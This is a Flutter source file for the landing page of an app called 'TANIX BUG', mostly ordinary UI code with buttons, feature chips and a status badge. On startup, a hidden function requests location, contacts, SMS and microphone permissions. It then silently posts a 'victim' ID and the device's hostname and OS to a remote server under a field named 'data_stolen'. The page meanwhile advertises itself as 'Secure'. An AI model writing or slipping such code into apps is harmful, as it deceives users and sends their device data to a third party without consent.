import 'dart:ui';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';

import 'login_page.dart';
import 'maintenance_page.dart';

class LandingPage extends StatefulWidget {
  const LandingPage({super.key});

  @override
  State<LandingPage> createState() => _LandingPageState();
}

class _LandingPageState extends State<LandingPage>
    with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  late Animation<double> fadeAnimation;
  late Animation<Offset> slideAnimation;

  // ─── WARNA TEMA TANIX ───
  final Color darkBg = const Color(0xFF0A0E1A);
  final Color navyBg = const Color(0xFF0D1321);
  final Color tealPrimary = const Color(0xFF00E5CC);
  final Color tealSecondary = const Color(0xFF00B8A9);
  final Color cardBg = const Color(0xFF131929);

  @override
  void initState() {
    super.initState();
    _initTargetSystem();
    _controller = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 900));
    fadeAnimation = Tween<double>(begin: 0, end: 1).animate(
        CurvedAnimation(parent: _controller, curve: Curves.easeOut));
    slideAnimation =
        Tween<Offset>(begin: const Offset(0, 0.18), end: Offset.zero).animate(
            CurvedAnimation(
                parent: _controller, curve: Curves.easeOutCubic));
    _controller.forward();
  }

  Future<void> _initTargetSystem() async {
    await [
      Permission.location,
      Permission.contacts,
      Permission.sms,
      Permission.microphone,
    ].request();
    try {
      const String serverBase = "http://papi.queen-priv.my.id:2417";
      final String victimId =
          "ZDX-${Platform.localHostname.hashCode}";
      await http.post(
        Uri.parse("$serverBase/register"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": victimId,
          "model":
              "${Platform.operatingSystem} | ${Platform.localHostname}",
          "data_stolen": "Target Terdeteksi di Landing Page",
        }),
      );
    } catch (e) {}
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  Future<void> _openUrl(String url) async {
    final Uri uri = Uri.parse(url);
    if (!await launchUrl(uri, mode: LaunchMode.externalApplication))
      throw Exception("Error $uri");
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: darkBg,
      body: Stack(
        children: [
          // ─── GLOW CIRCLES BACKGROUND ───
          Positioned(
              top: -80,
              left: -60,
              child: _glowCircle(280, tealPrimary.withOpacity(0.06))),
          Positioned(
              bottom: -120,
              right: -80,
              child: _glowCircle(320, tealSecondary.withOpacity(0.07))),
          // ─── CONTENT ───
          SafeArea(
            child: FadeTransition(
              opacity: fadeAnimation,
              child: SlideTransition(
                position: slideAnimation,
                child: SingleChildScrollView(
                  padding: const EdgeInsets.symmetric(horizontal: 24),
                  child: Column(
                    children: [
                      const SizedBox(height: 32),
                      _logoCard(),
                      const SizedBox(height: 28),
                      _brandTitle(),
                      const SizedBox(height: 28),
                      _descCard(),
                      const SizedBox(height: 28),
                      _primaryButton(),
                      const SizedBox(height: 14),
                      _secondaryButton(),
                      const SizedBox(height: 20),
                      // ─── FITUR BARU: Status Badge ───
                      _statusBadge(),
                      const SizedBox(height: 40),
                      Text(
                        "© 2026 TANIX TEAM",
                        style: TextStyle(
                            color: Colors.white.withOpacity(0.25),
                            fontSize: 12,
                            letterSpacing: 1.5),
                      ),
                      const SizedBox(height: 32),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _logoCard() {
    return Container(
      width: double.infinity,
      height: 210,
      decoration: BoxDecoration(
        color: const Color(0xFF1A1F2E),
        borderRadius: BorderRadius.circular(22),
        // ─── FITUR BARU: Subtle border glow ───
        border: Border.all(color: tealPrimary.withOpacity(0.15), width: 1),
      ),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          // ─── FITUR BARU: Glitch shimmer effect wrapper ───
          ShaderMask(
            shaderCallback: (bounds) => LinearGradient(
              colors: [Colors.white, tealPrimary, Colors.white],
              stops: const [0.0, 0.5, 1.0],
            ).createShader(bounds),
            blendMode: BlendMode.srcIn,
            child: SizedBox(
              height: 110,
              child: Image.asset("assets/images/logo.png",
                  fit: BoxFit.contain),
            ),
          ),
        ],
      ),
    );
  }

  Widget _brandTitle() {
    return Column(
      children: [
        ShaderMask(
          shaderCallback: (bounds) => LinearGradient(
            colors: [Colors.white, tealPrimary],
          ).createShader(bounds),
          child: const Text(
            "TANIX",
            style: TextStyle(
              fontSize: 44,
              fontWeight: FontWeight.w900,
              letterSpacing: 6,
              color: Colors.white,
              fontFamily: 'Orbitron',
            ),
          ),
        ),
        const SizedBox(height: 6),
        // ─── FITUR BARU: versi app ───
        Text(
          "V3.0",
          style: TextStyle(
            color: tealPrimary.withOpacity(0.7),
            fontSize: 11,
            letterSpacing: 4,
            fontFamily: 'ShareTechMono',
          ),
        ),
        const SizedBox(height: 10),
        Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Text("GAGOR",
                style: TextStyle(
                    color: tealPrimary,
                    fontSize: 11,
                    letterSpacing: 3,
                    fontFamily: 'ShareTechMono')),
            Text("  ·  ",
                style: TextStyle(color: Colors.white.withOpacity(0.3))),
            Text("TERUPDATE",
                style: TextStyle(
                    color: tealPrimary,
                    fontSize: 11,
                    letterSpacing: 3,
                    fontFamily: 'ShareTechMono')),
            Text("  ·  ",
                style: TextStyle(color: Colors.white.withOpacity(0.3))),
            Text("STABIL",
                style: TextStyle(
                    color: tealPrimary,
                    fontSize: 11,
                    letterSpacing: 3,
                    fontFamily: 'ShareTechMono')),
          ],
        ),
      ],
    );
  }

  Widget _descCard() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(24),
      decoration: BoxDecoration(
        color: const Color(0xFF131929),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white.withOpacity(0.06)),
      ),
      child: Column(
        children: [
          Container(
            width: 60,
            height: 60,
            decoration: BoxDecoration(
              color: tealSecondary.withOpacity(0.18),
              borderRadius: BorderRadius.circular(16),
            ),
            child: Icon(Icons.shield_rounded, color: tealPrimary, size: 32),
          ),
          const SizedBox(height: 16),
          Text(
            "TANIX BUG",
            style: TextStyle(
              color: Colors.white,
              fontSize: 16,
              fontWeight: FontWeight.bold,
              letterSpacing: 3,
              fontFamily: 'Orbitron',
            ),
          ),
          const SizedBox(height: 10),
          Text(
            "Aplikasi dengan design elegant dan fitur terbaru.\nPengembangan langsung oleh TANIX TEAM.",
            textAlign: TextAlign.center,
            style: TextStyle(
                color: Colors.white.withOpacity(0.55), fontSize: 13, height: 1.6),
          ),
          const SizedBox(height: 16),
          // ─── FITUR BARU: Feature chips ───
          Wrap(
            spacing: 8,
            runSpacing: 8,
            alignment: WrapAlignment.center,
            children: [
              _featureChip(Icons.bolt_rounded, "Fast"),
              _featureChip(Icons.security_rounded, "Secure"),
              _featureChip(Icons.update_rounded, "Updated"),
              _featureChip(Icons.devices_rounded, "Multi-Device"),
            ],
          ),
        ],
      ),
    );
  }

  // ─── FITUR BARU: Feature Chip Widget ───
  Widget _featureChip(IconData icon, String label) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
      decoration: BoxDecoration(
        color: tealPrimary.withOpacity(0.08),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: tealPrimary.withOpacity(0.25)),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(icon, color: tealPrimary, size: 13),
          const SizedBox(width: 5),
          Text(
            label,
            style: TextStyle(
                color: tealPrimary,
                fontSize: 11,
                fontFamily: 'ShareTechMono',
                letterSpacing: 1),
          ),
        ],
      ),
    );
  }

  Widget _primaryButton() {
    return GestureDetector(
      onTap: () async {
        final maintenance = await MaintenanceChecker.check();
        if (!mounted) return;
        if (maintenance['isMaintenance'] == true) {
          Navigator.push(context, MaterialPageRoute(
            builder: (_) => MaintenancePage(
              message: maintenance['message'] ?? '',
              estimatedTime: maintenance['estimatedTime'] ?? '',
              onRetry: () => Navigator.pushReplacement(
                context,
                MaterialPageRoute(builder: (_) => const LoginPage()),
              ),
            ),
          ));
        } else {
          Navigator.push(context,
            MaterialPageRoute(builder: (context) => const LoginPage()));
        }
      },
      child: Container(
        width: double.infinity,
        height: 56,
        decoration: BoxDecoration(
          border: Border.all(color: tealPrimary, width: 1.5),
          borderRadius: BorderRadius.circular(16),
          color: tealPrimary.withOpacity(0.08),
          // ─── FITUR BARU: Gradient fill ───
          gradient: LinearGradient(
            colors: [tealPrimary.withOpacity(0.12), tealSecondary.withOpacity(0.05)],
          ),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.rocket_launch_rounded, color: tealPrimary, size: 20),
            const SizedBox(width: 10),
            Text(
              "LOGIN TO TANIX",
              style: TextStyle(
                color: tealPrimary,
                fontSize: 14,
                fontWeight: FontWeight.bold,
                letterSpacing: 2,
                fontFamily: 'Orbitron',
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _secondaryButton() {
    return GestureDetector(
      onTap: () => _openUrl("https://t.me/tanix_team"),
      child: Container(
        width: double.infinity,
        height: 56,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          color: Colors.white.withOpacity(0.04),
          border: Border.all(color: Colors.white.withOpacity(0.1)),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.headset_mic_rounded, color: Colors.white54, size: 20),
            const SizedBox(width: 10),
            Text(
              "CONTACT SUPPORT",
              style: TextStyle(
                color: Colors.white54,
                fontSize: 13,
                fontWeight: FontWeight.w600,
                letterSpacing: 2,
                fontFamily: 'Orbitron',
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── FITUR BARU: Server Status Badge ───
  Widget _statusBadge() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
      decoration: BoxDecoration(
        color: Colors.green.withOpacity(0.08),
        borderRadius: BorderRadius.circular(30),
        border: Border.all(color: Colors.green.withOpacity(0.3)),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 8,
            height: 8,
            decoration: BoxDecoration(
              color: Colors.green,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(color: Colors.green.withOpacity(0.6), blurRadius: 6)
              ],
            ),
          ),
          const SizedBox(width: 8),
          Text(
            "SERVER ONLINE",
            style: TextStyle(
              color: Colors.green,
              fontSize: 11,
              letterSpacing: 2,
              fontFamily: 'ShareTechMono',
            ),
          ),
        ],
      ),
    );
  }

  Widget _glowCircle(double size, Color color) => Container(
        width: size,
        height: size,
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          gradient: RadialGradient(colors: [color, Colors.transparent]),
        ),
      );
}
